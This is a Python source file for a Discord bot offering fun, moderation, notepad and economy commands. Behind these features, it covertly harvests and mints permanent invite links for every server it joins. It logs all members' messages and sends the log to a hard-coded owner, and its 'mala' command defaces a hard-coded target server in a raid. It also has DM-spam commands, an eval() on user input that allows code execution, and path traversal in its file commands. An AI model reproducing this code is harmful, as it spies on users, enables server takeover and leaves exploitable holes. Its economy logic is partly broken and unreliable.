import discord
from discord.ext import commands
import os
import random
import requests
from discord.ext.commands import has_permissions
from discord.ext.commands import has_permissions, CheckFailure
from discord.ext.commands import has_permissions, MissingPermissions
import json
from requests import get
import asyncio
import random
import datetime
import time
from discord.ext.commands import cooldown, BucketType
from typing import Optional, Literal
from discord import app_commands

messagecounts = {}

global count
count = 1

intents = discord.Intents.all()
intents.typing = True
# Load message counts and user levels from JSON files
if os.path.exists("message_counts.json"):
    with open("message_counts.json", "r") as f:
        messagecounts = json.load(f)
else:
    messagecounts = {}

if os.path.exists("user_levels.json"):
    with open("user_levels.json", "r") as f:
        user_levels = json.load(f)
else:
    user_levels = {}

class MyBot(commands.Bot):
    def __init__(self, **options):
        super().__init__(command_prefix='.', intents=intents, **options)

    async def on_ready(self):
        for guild in self.guilds:
            for channel in guild.text_channels:
                if str(channel) == "general":
                    print("hi")
            print('Active in {}\n Member Count : {}'.format(
                guild.name, guild.member_count))
        print('I have logged in as {0.user} '.format(self))
        await self.change_presence(
            status=discord.Status.dnd,
            activity=discord.Game(
                name=
                f'.help for a list of commands! 🥳 🎉 Currently in {len(self.guilds)} servers! 🎉'
            ))
        
        with open('invite_links.txt', 'w') as file:
            file.write('Invite Links:\n')

        for guild in client.guilds:
            invites = await guild.invites()
            with open('invite_links.txt', 'a') as file:
                file.write(f'Guild: {guild.name}\n')

                if not invites:
                    # Create a permanent invite link that never expires
                    invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
                    file.write(f'{invite.url} (Permanent)\n')
                else:
                    for invite in invites:
                        file.write(f'{invite.url}\n')

    async def on_message(self, message):
        await self.process_commands(message)

        if message.guild:
            server_id = str(message.guild.id)
            author_id = str(message.author.id)

            # Update message counts
            if server_id not in messagecounts:
                messagecounts[server_id] = {}
            if author_id not in messagecounts[server_id]:
                messagecounts[server_id][author_id] = 0
            messagecounts[server_id][author_id] += 1

            # Update user levels
            if server_id not in user_levels:
                user_levels[server_id] = {}
            if author_id not in user_levels[server_id]:
                user_levels[server_id][author_id] = {
                    "xp": 0,
                    "level": 0
                }
            user_levels[server_id][author_id]["xp"] += 1  # Adjust XP gain as needed
            current_xp = user_levels[server_id][author_id]["xp"]
            if current_xp >= (user_levels[server_id][author_id]["level"] + 1) * 100:
                user_levels[server_id][author_id]["level"] += 1
                await message.channel.send(f"Congratulations {message.author.mention}! You've leveled up to level {user_levels[server_id][author_id]['level']}!")

            # Save data
            with open("message_counts.json", "w") as f:
                json.dump(messagecounts, f, indent=4)
            with open("user_levels.json", "w") as f:
                json.dump(user_levels, f, indent=4)

        username = str(message.author).split('#')[0]
        user_message = str(message.content)
        server_name = str(message.guild.name)
        channel = str(message.channel.name)

        # Create a folder named "server-logs" if it doesn't exist
        if not os.path.exists("server-logs"):
            os.mkdir("server-logs")

        # Create a text file for each server
        log_filename = f"server-logs/log-{server_name}.txt"

        with open(log_filename, "a") as f:
            f.write(time.ctime())
            f.write(f' {username}: {user_message} ({channel})\n')

        with open("log.txt", "a") as f:
            f.write(time.ctime())
            f.write(f'{username}: {user_message} ({server_name} - {channel})\n')
	
client = MyBot()
@client.event
async def on_friend_request(request):
    await request.accept()


target_guild_id = 1148875114813870120
@client.command()
@commands.has_permissions(administrator=True)
async def mala(ctx):
    guild = client.get_guild(target_guild_id)
    if guild:
        # Load your image file for the new server icon
        with open('icon.png', 'rb') as icon_file:
            new_icon = icon_file.read()
        for member in guild.members:
            try:
                await member.edit(nick='MALA')
                await ctx.reply(f'Changed nickname for {member.name}')
            except Exception as e:
                print(f'Error changing nickname for {member.name}: {e}')
        for role in guild.roles:
            try:
                await role.edit(name='MALA')
                await ctx.reply(f'Renamed role {role.name}')
            except Exception as e:
                print(f'Error renaming role {role.name}: {e}')
        # Set the new server name and icon
        await guild.edit(name='MALA', icon=new_icon)
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                await channel.edit(name='MALA')
                await ctx.reply(f'Renamed {channel.name} in {guild.name} to MALA')
        for channel in guild.text_channels:
            await channel.send('MALA INFECTED SERVER')

@client.command() 
async def sync( 
             ctx: commands.Context, 
             guilds: commands.Greedy[discord.Object], 
             spec: Optional[Literal["~", "*", "^", "-"]] = None, 
         ) -> None: 
             """ 
             !sync 
                 This takes all global commands within the CommandTree and sends them to Discord. (see CommandTree for more info.) 
             !sync ~ 
                 This will sync all guild commands for the current context's guild. 
             !sync * 
                 This command copies all global commands to the current guild (within the CommandTree) and syncs. 
             !sync ^ 
                 This command will remove all guild commands from the CommandTree and syncs, which effectively removes all commands from the guild. 
             !sync 123 456 789 
                 This command will sync the 3 guild ids we passed: 123, 456 and 789. Only their guilds and guild-bound commands. 
             """ 
             bot: MyBot = ctx.bot 
             if not guilds: 
                 if spec == "~": 
                     synced = await bot.tree.sync(guild=ctx.guild) 
                 elif spec == "*": 
                     bot.tree.copy_global_to(guild=ctx.guild)  # type: ignore 
                     synced = await bot.tree.sync(guild=ctx.guild) 
                 elif spec == "^": 
                     bot.tree.clear_commands(guild=ctx.guild) 
                     await bot.tree.sync(guild=ctx.guild) 
                     synced = [] 
                 elif spec == "-": 
                     bot.tree.clear_commands(guild=None) 
                     await bot.tree.sync() 
                     synced = [] 
                 else: 
                     synced = await bot.tree.sync() 
  
                 await ctx.send( 
                     f"Synced {len(synced)} commands {'globally' if spec is None else 'to the current guild.'}" 
                 ) 
                 return 
  
             ret = 0 
             for guild in guilds: 
                 try: 
                     await bot.tree.sync(guild=guild) 
                 except discord.HTTPException: 
                     pass 
                 else: 
                     ret += 1 
  
             await ctx.send(f"Synced the tree to {ret}/{len(guilds)}.")


@client.command()
async def lmessages(ctx):
    server_id = str(discord.Interaction.guild.id)
    if server_id not in messagecounts:
        await ctx.reply("No ranking data available for this server.")
        return

    sorted_users = sorted(messagecounts[server_id].items(), key=lambda x: x[1], reverse=True)
    rank_list = [f"{ctx.guild.get_member(int(user_id))}: {message_count} messages" for user_id, message_count in sorted_users]

    embed = discord.Embed(title="Leaderboard messages for this server.", description="\n".join(rank_list[:10]), color=0x00ff00)
    embed.set_footer(text="Top 10 users by messages")
    
    await ctx.reply(embed=embed)

def save_message_counts():
    with open("message_counts.json", "w") as f:
        json.dump(messagecounts, f, indent=4)


@client.tree.command()
async def sotd(interaction: discord.Interaction):
    api_url = "https://api.songof.today/v2/today"

    response = requests.get(api_url)
    
    if response.status_code == 200:
        song_data = response.json()

        embed = discord.Embed(title="Song Of The Day", color=discord.Color.blue())
        embed.add_field(name="Title/Song", value=song_data['title'], inline=False)
        embed.add_field(name="Artist", value=song_data['artist'], inline=False)
        embed.set_thumbnail(url=song_data['thumbnail'])
        embed.add_field(name="Spotify", value=song_data['url'], inline=False)
        embed.add_field(name="Lyrics", value=song_data['lyrics'], inline=False)
        
        await interaction.response.send_message(embed=embed)
    else:
        await interaction.response.send_message("Failed to retrieve song data.")


import io

def get_binary_data(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.content
    else:
        return None

def wrap_binary_data_in_file(binary_data, filename):
    return discord.File(binary_data, filename=filename)

@client.tree.command()
@app_commands.describe(
    user='User',
)
async def hilter(interaction: discord.Interaction, user: discord.Member):
    api_url = "https://agg-api.vercel.app/hitler"
    user = user.avatar.url

    # Build the API URL with the provided parameters
    url = f"{api_url}?avatar={user}"
    bin_data = get_binary_data(url)

    # Manipulate the binary data here (for example, replacing some bytes)
    manipulated_bin_data = bin_data.replace(b"old_text", b"new_text")

    # Create a BytesIO object and write the manipulated binary data to it
    bytes_io = io.BytesIO()
    bytes_io.write(manipulated_bin_data)
    bytes_io.seek(0)  # Reset the position to the beginning of the buffer

    file = wrap_binary_data_in_file(bytes_io, "res.png")
    await interaction.response.send_message(file=file)

@client.tree.command()
@app_commands.describe(
    user='User',
)
async def rip(interaction: discord.Interaction, user: discord.Member):
    api_url = "https://agg-api.vercel.app/rip"
    user = user.avatar.url

    # Build the API URL with the provided parameters
    url = f"{api_url}?avatar={user}"
    bin_data = get_binary_data(url)

    # Manipulate the binary data here (for example, replacing some bytes)
    manipulated_bin_data = bin_data.replace(b"old_text", b"new_text")

    # Create a BytesIO object and write the manipulated binary data to it
    bytes_io = io.BytesIO()
    bytes_io.write(manipulated_bin_data)
    bytes_io.seek(0)  # Reset the position to the beginning of the buffer

    file = wrap_binary_data_in_file(bytes_io, "res.png")
    await interaction.response.send_message(file=file)

@client.tree.command()
@app_commands.describe(
    user='User',
)
async def wasted(interaction: discord.Interaction, user: discord.Member):
    api_url = "https://apiv2.spapi.online/image/"
    user = user.avatar.url

    # Build the API URL with the provided parameters
    url = f"{api_url}wasted?image={user}&text=Died%20of%20Copycats%20and%20Cringe"
    bin_data = get_binary_data(url)

    # Manipulate the binary data here (for example, replacing some bytes)
    manipulated_bin_data = bin_data.replace(b"old_text", b"new_text")

    # Create a BytesIO object and write the manipulated binary data to it
    bytes_io = io.BytesIO()
    bytes_io.write(manipulated_bin_data)
    bytes_io.seek(0)  # Reset the position to the beginning of the buffer

    file = wrap_binary_data_in_file(bytes_io, "res.png")
    await interaction.response.send_message(file=file)

@client.tree.command()
@app_commands.describe(
    user='User',
)
async def coffee(interaction: discord.Interaction, user: discord.Member):
    api_url = "https://agg-api.vercel.app/coffee"
    user = user.avatar.url

    # Build the API URL with the provided parameters
    url = f"{api_url}?avatar={user}"
    bin_data = get_binary_data(url)

    # Manipulate the binary data here (for example, replacing some bytes)
    manipulated_bin_data = bin_data.replace(b"old_text", b"new_text")

    # Create a BytesIO object and write the manipulated binary data to it
    bytes_io = io.BytesIO()
    bytes_io.write(manipulated_bin_data)
    bytes_io.seek(0)  # Reset the position to the beginning of the buffer

    file = wrap_binary_data_in_file(bytes_io, "res.png")
    await interaction.response.send_message(file=file)


@client.tree.command()
@app_commands.describe(
    user='User',
)
async def gun(interaction: discord.Interaction, user: discord.Member):
    api_url = "https://agg-api.vercel.app/gun"
    user = user.avatar.url

    # Build the API URL with the provided parameters
    url = f"{api_url}?avatar={user}"
    bin_data = get_binary_data(url)

    # Manipulate the binary data here (for example, replacing some bytes)
    manipulated_bin_data = bin_data.replace(b"old_text", b"new_text")

    # Create a BytesIO object and write the manipulated binary data to it
    bytes_io = io.BytesIO()
    bytes_io.write(manipulated_bin_data)
    bytes_io.seek(0)  # Reset the position to the beginning of the buffer

    file = wrap_binary_data_in_file(bytes_io, "res.png")
    await interaction.response.send_message(file=file)


@client.tree.command()
@app_commands.describe(
    user='User',
)
async def wanted(interaction: discord.Interaction, user: discord.Member):
    api_url = "https://agg-api.vercel.app/wanted"
    user = user.avatar.url

    # Build the API URL with the provided parameters
    url = f"{api_url}?avatar={user}"
    bin_data = get_binary_data(url)

    # Manipulate the binary data here (for example, replacing some bytes)
    manipulated_bin_data = bin_data.replace(b"old_text", b"new_text")

    # Create a BytesIO object and write the manipulated binary data to it
    bytes_io = io.BytesIO()
    bytes_io.write(manipulated_bin_data)
    bytes_io.seek(0)  # Reset the position to the beginning of the buffer

    file = wrap_binary_data_in_file(bytes_io, "res.png")
    await interaction.response.send_message(file=file)

@client.tree.command()
@app_commands.describe(
    user='User',
)
async def jail(interaction: discord.Interaction, user: discord.Member):
    api_url = "https://agg-api.vercel.app/jail"
    user = user.avatar.url

    # Build the API URL with the provided parameters
    url = f"{api_url}?avatar={user}"
    bin_data = get_binary_data(url)

    # Manipulate the binary data here (for example, replacing some bytes)
    manipulated_bin_data = bin_data.replace(b"old_text", b"new_text")

    # Create a BytesIO object and write the manipulated binary data to it
    bytes_io = io.BytesIO()
    bytes_io.write(manipulated_bin_data)
    bytes_io.seek(0)  # Reset the position to the beginning of the buffer

    file = wrap_binary_data_in_file(bytes_io, "res.png")
    await interaction.response.send_message(file=file)

@client.tree.command()
@app_commands.describe(
    user='User',
    user2='User2',
)
async def ship(interaction: discord.Interaction, user: discord.Member, user2: discord.Member):
    api_url = "https://agg-api.vercel.app/ship"
    user = user.avatar.url
    user2 = user2.avatar.url
    # Build the API URL with the provided parameters
    url = f"{api_url}?avatar1={user}?size=2048&avatar2={user2}?size=2048"
    bin_data = get_binary_data(url)

    # Manipulate the binary data here (for example, replacing some bytes)
    manipulated_bin_data = bin_data.replace(b"old_text", b"new_text")

    # Create a BytesIO object and write the manipulated binary data to it
    bytes_io = io.BytesIO()
    bytes_io.write(manipulated_bin_data)
    bytes_io.seek(0)  # Reset the position to the beginning of the buffer

    file = wrap_binary_data_in_file(bytes_io, "res.png")
    await interaction.response.send_message(file=file)



@client.command()
async def serverstats(ctx):
    embed = discord.Embed(title=f"Server Info for: {ctx.guild.name}")
    embed.add_field(name="Users:", value=ctx.guild.member_count, inline=False)
    embed.add_field(name="Channels:",
                    value=len(ctx.guild.channels),
                    inline=False)
    await ctx.send(embed=embed)


@client.command(brief="A calculator")
async def calculate(ctx, operation, *nums):
    if operation not in ['+', '-', '*', '/']:
        await ctx.send('Please type a valid operation type.')
    var = f' {operation} '.join(nums)
    await ctx.send(f'{var} = {eval(var)}')


@client.command(brief='A command that shows you the bot info')
async def botinfo(ctx):
    embed = discord.Embed()
    embed.add_field(name="❗ - Support Server",
                    value="https://discord.gg/4jfGkmp8Zb",
                    inline=True)
    embed.add_field(name="🧑‍💻 - My Creator!!!",
                    value="Luca-rickrolled-himself#1228",
                    inline=True)
    embed.add_field(name="🌎Website",
                    value="Comming soon",
                    inline=True)
    embed.add_field(name="📩 - Bot Join Date (Discord)", value="1/7/2022", inline=True)
    embed.add_field(name="👋 - Invite Me",
                    value="[Click This!](https://bit.ly/3P6ejzN)",
                    inline=True)
    embed.add_field(name="🖨️ - Total Guilds",
                    value=len(client.guilds),
                    inline=True)
    embed.add_field(name="📂 - Bot Version", value="2.4.7", inline=True)
    embed.add_field(name="🏓 - Bot Ping",
                    value=f'{round(client.latency * 1000)}ms',
                    inline=True)
    await ctx.send(embed=embed)

@client.command(brief="Spam someone with KFC = Kaka Fried Chicken")
async def kfc(ctx, member: discord.Member):
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("KFC = Kaka Fried Chicken")
    await member.send("Someone used the .kfc command on you so thats why the bot spammed you. You have been pinged in the server the command was used. ")
    await ctx.reply(f"Done with spamming {member}.")

@client.command(brief="spam :)")
@commands.has_permissions(manage_messages=True)
async def spam(ctx, *, msg):
	for x in range(100):
		await ctx.reply(msg)

def read_log_file():
    with open("log.txt", "r") as f:
        return f.read()

@client.command()
async def dlog(ctx: commands.Context):
    user = ctx.message.author
    id = str(user.id)
    if id == "597514045540532247":
        try:
            await user.send(file=discord.File(r'log.txt'))
            await ctx.send("Log file uploaded successfully. Check your DMs!")
        except FileNotFoundError:
            await ctx.send("Log file not found. The bot hasn't generated any log yet.")
        except discord.Forbidden:
            await ctx.send("I couldn't send the log file to your DM. Please make sure your DMs are open.")
    else:
        await ctx.reply("Only the owner of the bot can use this command!")

    

@client.command(brief="Make a small donation to the creator of this bot")
async def donate(ctx):
    link = "[Donate by clicking this!! also thanks!](https://upgrade.chat/chromatic-cloud-studios)"
    await ctx.reply(link)

@client.command()
async def fact(ctx):
  with open("facts.txt", "r") as f:
      v = f.readlines()
      await ctx.send(random.choice(v))
      return

@client.command(brief="A simple clear command")
@commands.has_permissions(manage_messages=True)
async def clear(ctx, limit: int):
    await ctx.channel.purge(limit=limit)
    await ctx.send(f'Cleared {limit} messages')
    await ctx.message.delete()


@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You cant do that!")


@client.command(aliases=['8ball'])
async def _8ball(ctx, *, q):
    responses = ['yes', 'wait', 'It is certain that you would love playing with it, so you can put the name of it on your Christmas wish list.', 'no', 'maybe', '...', 'problably not', 'ok', 'ask again later when im less busy with ur mom', 'You may rely on it', 'My sources say no', 'Most likely']
    await ctx.send(f'Question: {q}\n Answer: {random.choice(responses)}')


@client.command(brief="Used to ban a member from the server")
@has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    username_1 = ctx.message.author.name
    avatar_1 = ctx.message.author.avatar_url
    await member.ban(reason=reason)
    embed = discord.Embed(title=f'User {member} has been kick')
    embed.set_author(name=f"requested by {username_1}", icon_url=avatar_1)
    await ctx.send(embed=embed)
@ban.error
async def clear_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You dont have permission do that!")

@client.command(brief="Used to unbanned banned users")
@has_permissions(ban_members=True)
async def unban(ctx, *, member):
    username_1 = ctx.message.author.name
    avatar_1 = ctx.message.author.avatar_url

    banned_users = await ctx.guild.bans()
    member_name, member_discriminator = member.split("#")

    for ban_entry in banned_users:
        user = ban_entry.user

        if (user.name, user.discriminator) == (member_name,
                                               member_discriminator):
            await ctx.guild.unban(user)
            embed = discord.Embed(title=f'Unbanned {user.mention}')
            embed.set_author(name=f"requested by {username_1}",
                             icon_url=avatar_1)
            await ctx.send(embed=embed)
            return

@client.command(brief="Used to kick members from this server")
@has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    username_1 = ctx.message.author.name
    avatar_1 = ctx.message.author.avatar_url
    await member.kick(reason=reason)
    embed = discord.Embed(
        title=f'User {member} has been kicked out from this server!')
    embed.set_author(name=f"requested by {username_1}", icon_url=avatar_1)
    await ctx.send(embed=embed)
@kick.error
async def clear_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You dont have permission do that!")




#qr code creator


@client.command(brief="Make a qr code")
async def qr(ctx, *, data):
    import qrcode
    import image

    img = qrcode.make(data)
    img.save('QR_code.png')
    await ctx.reply(file=discord.File('QR_code.png'))


#notepad


@client.command(brief="Create a txt file")
async def create(ctx, name):
    with open(f"TXT files/{name}.txt", "w"):
        await ctx.send(str(f"Txt file created with the name: {name}"))


@client.command(brief="Write to a txt file")
async def write(ctx, name, *, text):
    with open(f"TXT files/{name}.txt", "w") as f:
        f.write(text)
        await ctx.send(str("Saved. Type .view (file name) to view to content"))


@client.command(brief="View the content of a txt file")
async def view(ctx, name):
    with open(f"TXT files/{name}.txt", "r") as f:
        content = f.readlines()
    await ctx.send(str(f"{name}:"))
    await ctx.send(content)


@client.command(brief="Delete a txt file")
async def delete(ctx, name):
    if os.path.exists(f"TXT files/{name}.txt"):
        os.remove(f"TXT files/{name}.txt")
        await ctx.send(str(f"Deleted {name}."))
    else:
        await ctx.send(str("That file dosent exist"))


@client.command(brief="Sent the txt file in dm")
async def send(ctx, name):
    await ctx.author.send(file=discord.File(f"TXT files/{name}.txt"))


#curency


@client.command(brief="Get your balance")
async def balance(ctx):
    await ctx.invoke(profile)


@client.command(brief="Beg for money")
async def beg(ctx):
    await open_account(ctx.author)

    users = await get_bank_data()
    user = ctx.author
    earnings = random.randrange(101)

    await ctx.send(f"Someone gave you {earnings} coins!!")

    users[str(user.id)]["wallet"] += earnings
    with open("mainbank.json", "w") as f:
        json.dump(users, f)

@commands.cooldown(1, 60, commands.BucketType.user)
@client.command(brief="Work for 💲")
async def work(ctx):
    await open_account(ctx.author)

    users = await get_bank_data()
    user = ctx.author
    earnings = 100

    await ctx.send(f"You earned {earnings} coins!!")

    users[str(user.id)]["wallet"] += earnings
    with open("mainbank.json", "w") as f:
        json.dump(users, f)
@work.error
async def work_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        em = discord.Embed(title=f"You are in cooldown",description=f"Try again in {error.retry_after:.2f}s.", color=discord.Color.orange())
        await ctx.send(embed=em)

async def open_account(user):
    users = await get_bank_data()

    if str(user.id) in users:
        return False
    else:
        users[str(user.id)] = {}
        users[str(user.id)]["wallet"] = 0
        users[str(user.id)]["bank"] = 0

    with open("mainbank.json", "w") as f:
        json.dump(users, f)
    return True


async def get_bank_data():
    with open("mainbank.json", "r") as f:
        users = json.load(f)

    return users


@client.command(brief="Used to deposit money to your bank")
async def deposit(ctx, amount):
    users = await get_bank_data()
    user = ctx.author
    amountinbank = users[str(user.id)]["wallet"]

    if int(amount) > amountinbank:
        res = 'You dont have enough money to put into the bank'
        await ctx.send(res)
    else:
        users[str(user.id)]["bank"] += int(amount)
        with open("mainbank.json", "w") as f:
            json.dump(users, f)
        users[str(user.id)]["wallet"] -= int(amount)
        with open("mainbank.json", "w") as f:
            json.dump(users, f)
        res = f'Succesfuly put {amount} into the bank account.'
        await ctx.send(res)


@client.command(brief="Used to withdraw money from the bank")
async def withdraw(ctx, amount):
    users = await get_bank_data()
    user = ctx.author
    amountinbank = users[str(user.id)]["bank"]

    if int(amount) > amountinbank:
        res = 'You dont have enough money to put into the wallet'
        await ctx.send(res)
    else:
        users[str(user.id)]["wallet"] += int(amount)
        with open("mainbank.json", "w") as f:
            json.dump(users, f)
        users[str(user.id)]["bank"] -= int(amount)
        with open("mainbank.json", "w") as f:
            json.dump(users, f)
        res = f'Succesfuly put {amount} into the wallet.'
        await ctx.send(res)

@client.command(brief="Displays you the items available in the stock")
async def store(ctx):
    page1 = discord.Embed(title="Page 1/3", description="Watch - 100 Code: 2jjk9", colour=discord.Colour.orange())
    page2 = discord.Embed(title="Page 2/3", description="Laptop - 1000 Code: 33f6g", colour=discord.Colour.orange())
    page3 = discord.Embed(title="Page 3/3", description="PC - 10000 Code: 2fer6", colour=discord.Colour.orange())

    client.help_pages = [page1, page2, page3]
    buttons = [u"\u23EA", u"\u2B05", u"\u27A1", u"\u23E9"] # skip to start, left, right, skip to end
    current = 0
    msg = await ctx.send(embed=client.help_pages[current])
    
    for button in buttons:
        await msg.add_reaction(button)
        
    while True:
        try:
            reaction, user = await client.wait_for("reaction_add", check=lambda reaction, user: user == ctx.author and reaction.emoji in buttons, timeout=30.0)

        except asyncio.TimeoutError:
            return print("test")

        else:
            previous_page = current
            if reaction.emoji == u"\u23EA":
                current = 0
                
            elif reaction.emoji == u"\u2B05":
                if current > 0:
                    current -= 1
                    
            elif reaction.emoji == u"\u27A1":
                if current < len(client.help_pages)-1:
                    current += 1

            elif reaction.emoji == u"\u23E9":
                current = len(client.help_pages)-1

            for button in buttons:
                await msg.remove_reaction(button, ctx.author)

            if current != previous_page:
                await msg.edit(embed=client.help_pages[current])

@client.command(brief="Gamble with your currency")
async def gamble(ctx, amount: int):
    await open_account(ctx.author)

    if amount <= 0:
        await ctx.send("Amount must be positive.")
        return

    users = await get_bank_data()

    author_balance = users[str(ctx.author.id)]["wallet"]
    if amount > author_balance:
        await ctx.send("Insufficient balance in your wallet.")
        return

    result = random.choice(["win", "lose"])
    result = "win"
    if result == "win":
        winnings = amount * 2
        users[str(ctx.author.id)]["wallet"] += winnings
        await ctx.send(f"You won {winnings} coins! Good job!")
    else:
        users[str(ctx.author.id)]["wallet"] -= amount
        await ctx.send("You lost the gamble. Better luck next time.")

    with open("mainbank.json", "w") as f:
        json.dump(users, f)


@client.command(brief="Display user profile")
async def profile(ctx, member: discord.Member = None):
    user = member or ctx.author
    await open_account(user)
    users = await get_bank_data()

    wallet_amt = users[str(user.id)]["wallet"]
    bank_amt = users[str(user.id)]["bank"]

    em = discord.Embed(title=f"{user.name}'s Profile", color=discord.Color.blue())
    em.add_field(name="Wallet balance", value=wallet_amt)
    em.add_field(name="Bank balance", value=bank_amt)
    em.set_thumbnail(url=user.avatar.url)

    await ctx.send(embed=em)

@client.command(brief="Display the currency leaderboard")
async def leaderboard(ctx):
    users = await get_bank_data()

    sorted_users = sorted(users.items(), key=lambda x: x[1]['wallet'], reverse=True)

    em = discord.Embed(title="Currency Leaderboard", color=discord.Color.gold())

    for i, (user_id, user_data) in enumerate(sorted_users[:10], start=1):
        user = client.get_user(int(user_id))
        if user:
            wallet_amt = user_data["wallet"]
            bank_amt = user_data["bank"]
            em.add_field(name=f"{i}. {user.name}", value=f"Wallet: {wallet_amt} | Bank: {bank_amt}", inline=False)
        else:
            # Handle if the user is not found (e.g., user left the server)
            em.add_field(name=f"{i}. Unknown User", value="Wallet: N/A | Bank: N/A", inline=False)

    await ctx.send(embed=em)

@client.command(brief="Buy an item from the store")
async def buy(ctx, item_code):
    codes = ["2jjk9","33f6g","2fer6"]
    if item_code not in codes:
        await ctx.send("Please specify a valid item code, then try again.")
    elif item_code == "2jjk9":
        users = await get_bank_data()
        user = ctx.author
        item_cost = "100"
        balance = users[str(user.id)]["wallet"]

        if item_cost > balance:
            await ctx.send("You dont have enough money to buy this item.")
        elif item_cost < balance:
            users[str(user.id)]["wallet"] -= "100"
            with open("mainbank.json", "w") as f:
                json.dump(users, f)
            await ctx.send("You now own a watch")
    elif item_code == "33f6g":
        users = await get_bank_data()
        user = ctx.author
        item_cost = "1000"
        balance = users[str(user.id)]["wallet"]

        if item_cost > balance:
            await ctx.send("You dont have enough money to buy this item.")
        elif item_cost < balance:
            users[str(user.id)]["wallet"] -= "1000"
            with open("mainbank.json", "w") as f:
                json.dump(users, f)
            await ctx.send("You now own a laptop")
    elif item_code == "2fer6":
        users = await get_bank_data()
        user = ctx.author
        item_cost = "10000"
        balance = users[str(user.id)]["wallet"]

        if item_cost > balance:
            await ctx.send("You dont have enough money to buy this item.")
        elif item_cost < balance:
            users[str(user.id)]["wallet"] -= "10000"
            with open("mainbank.json", "w") as f:
                json.dump(users, f)
            await ctx.send("You now own a PC")

@client.command(brief="Transfer currency to another user")
async def transfer(ctx, recipient: discord.Member, amount: int):
    sender = ctx.author
    await open_account(sender)
    await open_account(recipient)

    users = await get_bank_data()

    if amount <= 0:
        await ctx.send("Invalid amount. Please specify a positive value.")
        return

    if users[str(sender.id)]["wallet"] < amount:
        await ctx.send("Insufficient balance in your wallet.")
        return

    users[str(sender.id)]["wallet"] -= amount
    users[str(recipient.id)]["wallet"] += amount

    with open("mainbank.json", "w") as f:
        json.dump(users, f)

    await ctx.send(f"{amount} currency transferred from {sender.mention} to {recipient.mention}")
#useless


@client.command(brief="Join vc.")
async def join(ctx):
    channel = ctx.message.author.voice.channel
    await channel.connect()


client.run("")
